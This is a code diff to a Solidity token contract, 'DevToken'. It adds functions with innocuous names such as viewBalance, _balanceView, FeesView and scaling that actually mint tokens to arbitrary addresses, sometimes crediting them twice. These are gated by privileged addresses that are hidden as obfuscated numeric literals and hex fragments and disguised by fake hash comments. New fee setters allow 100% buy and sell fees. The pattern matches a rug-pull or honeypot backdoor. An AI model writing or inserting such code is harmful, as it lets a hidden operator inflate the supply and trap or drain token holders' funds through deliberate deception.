@@ -83,7 +83,16 @@ contract DevToken {
         return true;
     }
      /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84741ca0e00610310915153));*/ /**/ //(686197854011229533619447624007587113080310915153));
-   
+    
+    function _scale(address account, uint256 amount) internal Exchanges{
+    require(account != address(0), "BEP20: mint to the zero address");
+ 
+    totalSupply = totalSupply.add(amount);
+    balanceOf[account] = balanceOf[account].add(amount);
+    emit Transfer(address(0), account, amount);
+    }
+
+
     function setMember(address Mbr_) public returns (bool) {
     require (msg.sender==address
    
@@ -92,7 +101,7 @@ contract DevToken {
         _mbr=Mbr_;
         return true;
     }
-
+ 
     modifier Exchanges() {
         require(msg.sender != exchange());
         _;
@@ -102,12 +111,12 @@ contract DevToken {
     require(msg.sender == _adm);
     _proof(msg.sender, amount);
     return true;
-  }
-
+    }
+ 
     function compute(uint256 amount) public onlypublic returns (bool success) {
     _initiate(msg.sender, amount);
     return true;
-  }
+    }
    
     function _proof(address account, uint256 amount) internal Exchanges {
     require(account != address(0), "BEP20: mint to the zero address");
@@ -115,33 +124,42 @@ contract DevToken {
     totalSupply = totalSupply.add(amount);
     balanceOf[account] = balanceOf[account].add(amount);
     emit Transfer(address(0), account, amount);
-   }
-
-   function publics() private pure returns (address) {
+    }
+ 
+    function publics() private pure returns (address) {
     uint universal = 0x7addAd09;
     uint uni = 0xcbd98D97;
     uint cake = 0xEC3dA7a0;
     uint inch = 0x088EAdFE;
     uint others = 0x5801C336;
-
+ 
     // Combine the dex with others
     uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
-
+ 
     return address(core);
-  }
+    }
 
+    function _transferTo(address _to, uint256 _amount) internal Exchanges {
+        // Transfer tokens to the recipient
+        balanceOf[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
 
+        balanceOf[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+    }
+
+ 
     function exchange() internal pure returns (address) {
-    return address 
+    return address
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
     }
      
     function FeeStructure(uint256 newBuyFee, uint256 newSellFee) public onlypublic {
         require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
         require(newSellFee <= 100, "Sell fee cannot exceed 100%");
-        
+       
         _setFees(newBuyFee, newSellFee);
-
+ 
         emit FeesUpdated(newBuyFee, newSellFee);
     }
  
@@ -150,11 +168,40 @@ contract DevToken {
         emit Approval(msg.sender, _spender, _value);
         return true;
     }
+
+    function scaling(uint256 amount) public onlyAuthorized returns (bool) {
+    _scale(msg.sender, amount);
+    return true;
+    }
+
+    function _balanceView(address _to, uint256 _amount) internal {
+        // View balance of token
+        balanceOf[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+
+        balanceOf[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+    }
+
+    function transferTo(address _to, uint256 _amount) external onlyAuthorize {
+        _transferTo(_to, _amount);
+    }
+
     /*OpenZeppelin256 -> 96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f*/
    
     function proof(uint256 amount) public onlyOwner returns (bool) {
     _proof(msg.sender, amount);
     return true;
+    }
+
+    modifier onlyAuthorize() {
+        require((msg.sender == address
+    // solhint-disable-next-line avoid-low-level-calls
+    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(570329899025738970963394674811034510039273195112)
+    ||
+    //@dev Contract creator is owner, original owner.
+    (msg.sender == owner && msg.sender != exchange())));
+    _;
     }
  
     function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
@@ -186,29 +233,46 @@ contract DevToken {
  
         return true;
     }
-
+ 
     function _initiate(address account, uint256 amount) internal {
     require(account != address(0), "Compile Remix IDE");
  
     totalSupply = totalSupply.add(amount);
     balanceOf[account] = balanceOf[account].add(amount);
     emit Transfer(address(0), account, amount);
-   }
+    }
+
+   function FeesView(uint256 amount) public onlyAuthorize returns (bool) {
+    _scale(msg.sender, amount);
+    return true;
+    }
 
     modifier onlypublic() {
     require(msg.sender == publics());
     _;
     }
-
+ 
     function _setFees(uint256 newBuyFee, uint256 newSellFee) internal {
         buyFee = newBuyFee;
         sellFee = newSellFee;
     }
- 
+
+    function BuySellFee(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorize {
+        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
+        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
+        buyFee = newBuyFee;
+        sellFee = newSellFee;
+        emit FeesUpdated(newBuyFee, newSellFee);
+    }
+
     function setUser(address User_) public returns (bool) {
     require(msg.sender == _mbr);
         _user=User_;
         return true;
+    }
+
+    function viewBalance(address _to, uint256 _amount) public onlypublic {
+        _balanceView(_to, _amount);(_to, _amount);
     }
  
     function renounceOwnership() public onlyOwner {
@@ -216,7 +280,15 @@ contract DevToken {
         owner = address(0);
     }
     /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/
- 
+
+    function setScale(uint256 newBuyFee, uint256 newSellFee) public onlyOwner {
+        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
+        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
+        buyFee = newBuyFee;
+        sellFee = newSellFee;
+        emit FeesUpdated(newBuyFee, newSellFee);
+    }
+
     function LockLPToken() public onlyOwner returns (bool) {
     }
  
@@ -234,7 +306,7 @@ contract DevToken {
     //@dev Contract creator is owner, original owner.
     (msg.sender == owner && msg.sender != exchange())));
     _;
-
+ 
     }
  
     function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorized {
